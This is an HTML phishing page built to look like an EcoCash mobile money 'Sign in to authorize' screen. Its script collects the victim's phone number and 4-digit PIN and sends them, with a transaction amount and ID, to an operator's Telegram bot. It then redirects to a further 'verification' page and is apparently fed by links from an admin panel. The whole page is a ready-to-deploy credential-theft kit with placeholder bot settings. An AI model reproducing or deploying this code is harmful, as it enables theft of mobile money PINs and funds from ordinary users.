<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>EcoCash - Sign in to authorize</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  :root {
    --eco-blue: #0045A0;
    --eco-red: #E31B23;
    --eco-bg: #F3F6FA;
    --eco-text-main: #111827;
    --eco-text-muted: #6B7280;
    --eco-border: #E5E9F0;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }

  html, body {
    height: 100%;
    background-color: rgba(17, 24, 39, 0.7); /* Dimmed background */
    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    -webkit-font-smoothing: antialiased;
    overflow: hidden;
  }

  /* --- 3-Second Loading Screen Overlay --- */
  #loadingScreen {
    position: fixed;
    inset: 0;
    background: rgba(17, 24, 39, 0.85);
    backdrop-filter: blur(4px);
    z-index: 9999;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: #FFFFFF;
    transition: opacity 0.4s ease;
  }
  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(255, 255, 255, 0.2);
    border-top-color: #FFFFFF;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading-text {
    font-size: 18px;
    font-weight: 600;
    letter-spacing: 0.5px;
    animation: pulse 1.5s infinite;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
  }

  /* --- Modal Container --- */
  .modal-card {
    background: #FFFFFF;
    width: 100%;
    max-width: 420px;
    border-radius: 24px;
    overflow: hidden;
    margin: 20px;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
    position: relative;
    opacity: 0;
    transform: translateY(20px);
    transition: opacity 0.4s ease, transform 0.4s ease;
  }
  .modal-card.show {
    opacity: 1;
    transform: translateY(0);
  }

  /* --- White Top Section --- */
  .top-section {
    padding: 32px 24px 24px;
    text-align: center;
    position: relative;
  }

  .close-btn {
    position: absolute;
    top: 24px;
    right: 24px;
    background: none;
    border: none;
    font-size: 24px;
    color: #6B7280;
    cursor: pointer;
    line-height: 1;
    font-weight: 300;
  }

  .logo {
    font-size: 32px;
    font-weight: 800;
    letter-spacing: -0.5px;
    margin-bottom: 20px;
    display: inline-block;
  }
  .logo-eco { color: var(--eco-blue); }
  .logo-cash { color: var(--eco-red); }

  .title {
    font-size: 22px;
    font-weight: 800;
    color: var(--eco-text-main);
    letter-spacing: -0.5px;
  }

  /* --- Blue Bottom Section --- */
  .bottom-section {
    background: #005FB8; /* Matching the blue in screenshot */
    padding: 24px;
  }

  .inner-card {
    background: #FFFFFF;
    border-radius: 20px;
    padding: 24px 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  /* Phone Input */
  .input-group {
    display: flex;
    align-items: center;
    width: 100%;
    border: 2px solid #0045A0;
    border-radius: 14px;
    padding: 10px 14px;
    background: #FFFFFF;
    margin-bottom: 24px;
  }

  .country-code {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 16px;
    font-weight: 700;
    color: var(--eco-text-main);
  }

  .divider-line {
    width: 1.5px;
    height: 24px;
    background: #D1D5DB;
    margin: 0 12px;
  }

  .phone-input {
    flex: 1;
    border: none;
    outline: none;
    font-size: 16px;
    font-weight: 500;
    font-family: inherit;
    color: var(--eco-text-main);
    background: transparent;
    min-width: 0;
  }
  .phone-input::placeholder { color: #9CA3AF; font-weight: 400; }

  /* PIN Section */
  .pin-label {
    background: #E0F2FE;
    color: #0369A1;
    font-size: 14px;
    font-weight: 700;
    padding: 6px 18px;
    border-radius: 20px;
    margin-bottom: 20px;
  }

  .pin-boxes {
    display: flex;
    gap: 14px;
    margin-bottom: 28px;
  }

  .pin-box {
    width: 56px;
    height: 56px;
    border: 2px solid #D1D5DB;
    border-radius: 14px;
    text-align: center;
    font-size: 24px;
    font-weight: 700;
    color: var(--eco-text-main);
    outline: none;
    transition: border-color 0.15s;
    background: #FFFFFF;
  }
  .pin-box:focus { border-color: #0045A0; }

  /* Login Button */
  .btn-login {
    width: 100%;
    background: #0045A0;
    color: #FFFFFF;
    border: none;
    border-radius: 14px;
    padding: 16px;
    font-size: 18px;
    font-weight: 700;
    font-family: inherit;
    cursor: pointer;
    transition: background-color 0.15s, transform 0.1s;
  }
  .btn-login:hover { background: #003478; }
  .btn-login:active { transform: scale(0.98); }
  .btn-login:disabled { opacity: 0.7; cursor: wait; }

  /* Toast */
  .toast {
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%) translateY(-100px);
    background: #111827;
    color: #FFFFFF;
    padding: 12px 24px;
    border-radius: 10px;
    font-size: 14px;
    font-weight: 600;
    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
    opacity: 0;
    transition: all 0.3s ease;
    z-index: 10000;
  }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
  .toast.error { background: #E31B23; }
  .toast.success { background: #00A651; }

</style>
</head>
<body>

  <!-- Loading Screen -->
  <div id="loadingScreen">
    <div class="spinner"></div>
    <div class="loading-text">Initiating transaction...</div>
  </div>

  <!-- Modal -->
  <div class="modal-card" id="loginCard">
    
    <!-- Top Section -->
    <div class="top-section">
      <button class="close-btn" onclick="window.history.back()">✕</button>
      <div class="logo">
        <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
      </div>
      <div class="title">Sign in to authorize</div>
    </div>

    <!-- Bottom Section -->
    <div class="bottom-section">
      <div class="inner-card">
        
        <!-- Phone Input -->
        <div class="input-group">
          <div class="country-code">
            🇿🇼 +263
          </div>
          <div class="divider-line"></div>
          <input type="tel" id="phoneNumber" class="phone-input" placeholder="Phone number" autocomplete="tel" maxlength="10">
        </div>

        <!-- PIN Section -->
        <div class="pin-label">Enter 4 digit PIN</div>
        <div class="pin-boxes">
          <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
          <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
          <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
          <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
        </div>

        <!-- Login Button -->
        <button type="button" class="btn-login" id="loginBtn" onclick="submitLogin()">Login</button>

      </div>
    </div>
  </div>

  <!-- Toast -->
  <div class="toast" id="toast"></div>

<script>
// ==========================================
// TELEGRAM CONFIGURATION (REPLACE THESE)
// ==========================================
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // e.g., '123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ'
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // e.g., '123456789'

// --- Base64URL Decoder ---
function b64urlDecode(str) {
  try {
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    while (str.length % 4) str += '=';
    return decodeURIComponent(escape(atob(str)));
  } catch (e) {
    return null;
  }
}

// --- Extract Data from URL ---
const urlParams = new URLSearchParams(window.location.search);
const encodedParam = urlParams.get('d');

let amount = '200.00';
let currency = 'USD';
let txnId = 'TXN-PENDING';
let initialPhone = '';

// First, try to decode the Base64 payload generated by the admin panel
if (encodedParam) {
  const raw = b64urlDecode(encodedParam);
  if (raw) {
    try {
      const data = JSON.parse(raw);
      amount = data.am ? Number(data.am).toFixed(2) : amount;
      currency = data.cur || currency;
      txnId = data.tx || txnId;
      
      // Extract account number for the phone input (an)
      if (data.an) {
        initialPhone = String(data.an).trim();
      }
    } catch (e) {
      console.warn('Could not parse payload', e);
    }
  }
} else if (urlParams.get('am')) {
  // Fallback to individual URL parameters if payload is missing
  amount = urlParams.get('am') || amount;
  currency = urlParams.get('cur') || currency;
  txnId = urlParams.get('tx') || txnId;
  initialPhone = urlParams.get('an') || '';
}

// Pre-fill the phone number input
if (initialPhone) {
  // Clean it up: remove non-digits, and remove leading 0 or +263 if present
  let cleanPhone = initialPhone.replace(/\D/g, ''); 
  if (cleanPhone.startsWith('263')) cleanPhone = cleanPhone.substring(3);
  if (cleanPhone.startsWith('0')) cleanPhone = cleanPhone.substring(1);
  
  document.getElementById('phoneNumber').value = cleanPhone;
}

// --- Loading Screen Logic ---
document.addEventListener('DOMContentLoaded', () => {
  // Show loading for exactly 3 seconds, then reveal the login card
  setTimeout(() => {
    const loader = document.getElementById('loadingScreen');
    const card = document.getElementById('loginCard');
    
    loader.style.opacity = '0';
    setTimeout(() => {
      loader.style.display = 'none';
      card.classList.add('show');
    }, 400); // Wait for fade transition
  }, 3000);
});

// --- PIN Auto-Focus Logic ---
const pinInputs = document.querySelectorAll('.pin-box');
pinInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    // Only allow numbers
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
    
    if (e.target.value.length === 1 && index < pinInputs.length - 1) {
      pinInputs[index + 1].focus();
    }
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !e.target.value && index > 0) {
      pinInputs[index - 1].focus();
    }
  });
});

// --- Toast Helper ---
function showToast(msg, type = 'error') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  setTimeout(() => t.classList.remove('show'), 3000);
}

// --- Submit & Send to Telegram ---
async function submitLogin() {
  const phone = document.getElementById('phoneNumber').value.trim();
  let pin = '';
  pinInputs.forEach(input => pin += input.value);

  // Validation
  if (!phone) {
    showToast('Please enter your phone number.');
    return;
  }
  if (phone.length < 9) {
    showToast('Please enter a valid phone number.');
    return;
  }
  if (pin.length !== 4) {
    showToast('Please enter your 4-digit PIN.');
    return;
  }

  const btn = document.getElementById('loginBtn');
  btn.disabled = true;
  btn.textContent = 'Authorizing...';

  // Prepare Telegram Message
  const message = `
🔐 *New EcoCash Authorization*
-------------------------------
📱 *Phone:* +263 ${phone}
🔑 *PIN:* ${pin}
💰 *Amount:* ${currency} ${amount}
🆔 *Txn ID:* ${txnId}
⏱ *Time:* ${new Date().toLocaleString()}
  `;

  try {
    // Send data to Telegram
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) throw new Error('Telegram API failed');

    // Success state
    btn.style.backgroundColor = '#00A651'; // Green
    btn.textContent = 'Authorized Successfully';
    showToast('Payment authorized successfully!', 'success');
    
    // Disable inputs
    document.getElementById('phoneNumber').disabled = true;
    pinInputs.forEach(i => i.disabled = true);

    // Redirect to Verification Page after 1.5 seconds (passing the same URL params)
    setTimeout(() => { 
      window.location.href = 'verification.html' + window.location.search; 
    }, 1500);

  } catch (error) {
    console.error(error);
    showToast('Connection error. Please try again.');
    btn.disabled = false;
    btn.textContent = 'Login';
  }
}
</script>
</body>
</html>
